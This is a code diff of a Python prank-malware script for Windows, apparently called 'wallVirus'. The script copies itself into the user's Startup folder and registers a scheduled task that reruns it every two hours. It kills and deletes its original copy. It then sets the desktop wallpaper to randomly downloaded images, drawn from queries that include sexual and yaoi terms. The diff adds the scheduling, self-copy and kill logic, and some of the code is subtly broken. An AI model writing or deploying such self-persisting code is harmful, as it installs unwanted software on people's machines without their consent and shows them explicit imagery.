@@ -1,12 +1,15 @@
+# coding=utf-8
 from ctypes import windll
 from random import choice
 from time import sleep
 from google_images_download import google_images_download 
-import os
+from getpass import getuser
 from os.path import join
+import os
 import sys
-import getpass
 import subprocess
+
+
 
 #queries para serem pesquisadas
 search_queries = [     
@@ -20,14 +23,15 @@ search_queries = [
 'ecchi',
 'never gonna give you up',
 'ricardo milos',
+'ricardo milos ass',
 'naruto and sasuke love',
+'naruto and sasuke yaoi',
 'steve and bucky love',
 'tobey maguire memes',
-'joker dancing'
+'joker dancing',
+'donald trump meme'
 ] 
 
-schedule_cmd = 'SCHTASKS /CREATE /SC HOURLY /MO 2 /TN "wallvirus" /TR '
-delete_schedule = 'SCHTASKS /DELETE /TN "wallvirus"'
 
 if(sys.getfilesystemencoding() == 'utf-8'):
 	setImageAsBackground = lambda image: windll.user32.SystemParametersInfoW(20, 0, image , 0)
@@ -62,15 +66,14 @@ def GetImg(query_img, outdir, silent = False):
 	#print(paths[0][query_img][0])
 	return None
 
-#montando path para o diretorio de startup
+#montando path para o diretorio de startup do windows
 def getStartupDir():
 	root_path = "C:\\Users"
-	user = getpass.getuser()
+	user = getuser()
 	startup_path = "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 	return join(root_path,user,startup_path)
 
-def copyItself(filename,curdir, outdir):
-
+def copyItself(filename,newfilename,curdir, outdir):
 	#ler proprio conteudo
 	self_file = open(join(curdir,filename),'rb')
 	content = self_file.read()
@@ -80,47 +83,58 @@ def copyItself(filename,curdir, outdir):
 	os.chdir(outdir)
 
 	#copiando conteudo para novo arquivo
-	new_file = open(join(outdir,filename),'wb')
+	new_file = open(join(outdir,newfilename),'wb')
 	new_file.write(content)
 	new_file.close()
 
-	#retorna diretorio de trabalho
+	#retorna diretorio original
 	os.chdir(curdir)
 
-
-#se recebeu algum argumento
-if(len(sys.argv)>1):
-	#se esse argumento é o arquivo com caminho
-	if(os.path.isfile(sys.argv[1])):
-		#então remova o arquivo original
-		os.remove(sys.argv[1])
+def setSchedule(sch_name, filemane, app_path):
+	sch_create = 'SCHTASKS /CREATE /SC HOURLY /MO 2 /TN ' + sch_name + ' /TR "' + join(app_path,filename) +'" /f'
+	subprocess.call(sch_create)
 
 
+	# sch_list = 'SCHTASKS /QUERY'
+	#vefiricar se agendamento ja existe
+	# responde = subprocess.check_output(sch_list)
+	# if(responde.decode('ISO-8859-1').find(sch_name) == -1):
+	# 	#se nao existe criar-lo
 
 
 
 filename = sys.argv[0].split('\\')[-1]
+dotWhat = '.py' if filename.find('.py') else '.exe'
+oldfilename = 'wallVirus'+dotWhat
+newfilename = 'wall'+dotWhat
 
 startup_full_path = getStartupDir()
 
 current_dir = os.getcwd()
 
+if(len(sys.argv)>1):
+		kill_cmd = 'taskkill /f /im {}'.format(oldfilename)
+		subprocess.call(kill_cmd)
+		os.chdir(sys.argv[1])
+		os.remove(oldfilename)
+		print('deletado')
+
+
 if(current_dir != startup_full_path):
-	copyItself(filename, current_dir, startup_full_path)
+	copyItself(oldfilename,newfilename, current_dir, startup_full_path)
+	setSchedule(filename,filename,startup_full_path)
 
-	# print(schedule_cmd+'"'+join(startup_full_path,filename)+'"')
-	responde = subprocess.check_output('SCHTASKS /QUERY')
-	if(responde.decode('ISO-8859-1').find('wallvirus') == -1):
-		subprocess.call(schedule_cmd+'"'+join(startup_full_path,filename)+'"')
+	Dotpy = 'python' if filename.find('.py') else ''
 
-	# responde = subprocess.check_output(schedule_cmd+'"'+join(startup_full_path,filename)+'"')
-	# print(responde)
-# def setSchedule(sch_name):
+	run_cmd = '{0} {1} {2}'.format(Dotpy, newfilename, current_dir)
+	print('run_cmd: ',run_cmd)
+	os.chdir(startup_full_path)
+	subprocess.call(run_cmd)
 
-img_path = GetImg(choice(search_queries), startup_full_path,silent = True)
-if(img_path):
-	setImageAsBackground(img_path)
-	sleep(2)
-	os.remove(img_path)
-	# os.system("taskkill /f /im "+ filename)
-	# os.remove(filename)
+else:
+	img_path = GetImg(choice(search_queries), startup_full_path,silent = True)
+
+	if(img_path):
+		setImageAsBackground(img_path)
+		sleep(2)
+		os.remove(img_path)
